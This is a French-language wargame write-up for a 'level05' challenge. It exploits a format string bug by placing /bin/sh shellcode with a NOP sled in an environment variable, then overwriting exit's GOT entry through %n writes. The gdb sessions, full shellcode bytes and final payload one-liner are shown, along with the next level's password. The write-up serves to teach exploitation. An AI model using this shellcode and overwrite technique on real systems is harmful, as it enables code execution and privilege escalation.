# Format String Exploitation

En décompilant l'exécutable, on remarque que le code décompilé n'est pas très lisible. En revanche, on remarque un `buffer` de `100` octets dans la fonction `main`, ainsi que la présence de la fonction `fgets` copiant directement l'entrée lue dans ce `buffer`.
```c
[...]
uint8_t auStack120 [100];
[...]
fgets(auStack120, 100, _reloc.stdin);
[...]
```
Un `overflow` ne semble ici pas possible en raison de la protection des `100` caractères lus par `fgets`. Néanmoins, on remarque la présence d'un `printf` suivi d'un appel à la fonction `exit`.
```c
printf(auStack120);
exit(0);
```
D'après nos tests, le code appelle systématiquement le fonction `printf` avant de se terminer avec l'appel à `exit`. Un exploit `format string` semble réalisable avec `printf`. L'objectif est de remplacer l'adresse de `exit` par l'adresse d'un `shell code`, puisqu'aucune fonction ne contient un appel à la fonction `system`.

Pour exploiter cette faille, nous aurons besoin au préalable de :
- exporter notre `shell code` dans une variable d'environnement.
- déterminer l'adresse cette variable d'environnement.
- déterminer l'`offset` utilisé par `printf` pour séléctionner les arguments.
- déterminer l'emplacement de l'adresse de `exit`.

## Export du `shell code`

On utilise simplement notre `shell code` habituel qui est :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```
On le précède d'instructions `NOP` pour être certain de `jump` sur notre `shell code`. Puis on l'exporte dans une variable d'environnement.
```
export SHELL_CODE=$(python -c 'print "\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

## Adresse du `shell code`

On utilise `gdb` afin de déterminer l'adresse de notre variable d'environnement.
```
> gdb level05
[...]
> (gdb)  b main
Breakpoint 1 at 0x8048449
> (gdb) r
[...]
> (gdb) x/140s environ
[...]
0xffffdb27:	 "SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdbef:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdcb7:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdd7f:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde47:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
[...]
```
L'adresse de notre variable d'environnement contenant notre `shell code` est `0xffffdb27`. Cependant, nous utiliserons `0xffffdcb7` afin de `jump` au milieu des instructions `NOP`.

## Offset de `printf`

On utilise une nouvelle fois `gdb` pour déterminer l'`offset` de `printf`. On donne en entrée standard `AAAA%p` afin de visualiser où sera copié notre entrée et visualiser l'adresse du premier argument de `printf` avec `%p`. On `break` à l'instruction suivant l'appel à `printf`.
```
> (gdb) disas main
[...]
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
[...]
> (gdb) b *0x0804850c
Breakpoint 1 at 0x804850c
> (gdb) r
Starting program: /home/users/level05/level05 
AAAA%p
aaaa0x64

Breakpoint 1, 0x0804850c in main ()
> (gdb) x/20wx $esp
0xffffd250:	0xffffd278	0x00000064	0xf7fcfac0	0xf7ec3af9
                                 ^
                                 premier argument de printf
0xffffd260:	0xffffd29f	0xffffd29e	0x00000000	0xffffffff
0xffffd270:	0xffffd324	0x00000000	0x61616161	0x000a7025
                                             ^
                                             AAAA
0xffffd280:	0x08048271	0x00000000	0x00c30000	0x00000001
0xffffd290:	0xffffd4a3	0x0000002f	0xffffd2ec	0xf7fceff4
```
On observe donc un `offset` de `10`.

## Adresse de `exit`

On peut déterminer l'adresse de la fonction `exit` avec `gdb`.
```
> (gdb) disas main
[...]
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
[...]
> (gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```
L'adresse contenant l'adresse la fonction `exit` est `0x80497e0`.

## Exploitation de la faille

Pour rappel, l'adresse de notre variable d'environnement est `0xffffdcb7` soit `4294958263` en base 10. Ce nombre est bien trop grand pour être utilisé dans un modifier `%d`. Il ne pourra pas être correctement interprété par la fonction `printf`. Ainsi, plutôt que d'écrire les 4 octets de notre adresses d'un coup, nous allons l'écrire par paire de 2 octets. En décomposant l'adresse de notre variable d'environnement en 2 octets nous avons donc :
```
0xffff    0xdcb7
```
Ainsi, nous écrirons `0xdcb7` à l'adresse de `exit` et `0xffff` à l'adresse de `exit` + `0x02`.
```
           ff ff dc b7
0x80497e0: 00 00 00 00
               ^     ^
               |     adresse de exit
               adresse de exit + 0x02
```
De manière abstraite, voici comment nous allons formatter notre entrée :
```
[adresse_exit] [adresse_exit + 0x02] [%d] [%10$n] [%d] [%11$n]
```
Pour déterminer le nombre à insérer entre chaque `%d`, il suffit de convertir nos octets en base 10, puis d'y soustraire le nombre d'octets imprimés par `printf` à partir du `%d`.

**`0xdcb7`**

```
[0x80497e0] [0x80497e2] [%d] [%10$n] [%d] [%11$n]
 ^           ^
 4 octets    4 octets
```
```
0xdcb7 = 56503 (base 10)
56503 - 8 = 56495
```

**`0xffff`**

```
[0x80497e0] [0x80497e2] [%56495d] [%10$n] [%d] [%11$n]
 ^           ^           ^
 4 octets    4 octets    56495 octets
```
```
0xffff = 65535 (base 10)
65535 - 56495 - 4 - 4 = 9032
```

Ainsi :
```
[0x80497e0] [0x80497e2] [%56495d] [%10$n] [%9032d] [%11$n]
```
```
> (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56495d" + "%10$n" + "%9032d" + "%11$n"'; cat) | ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
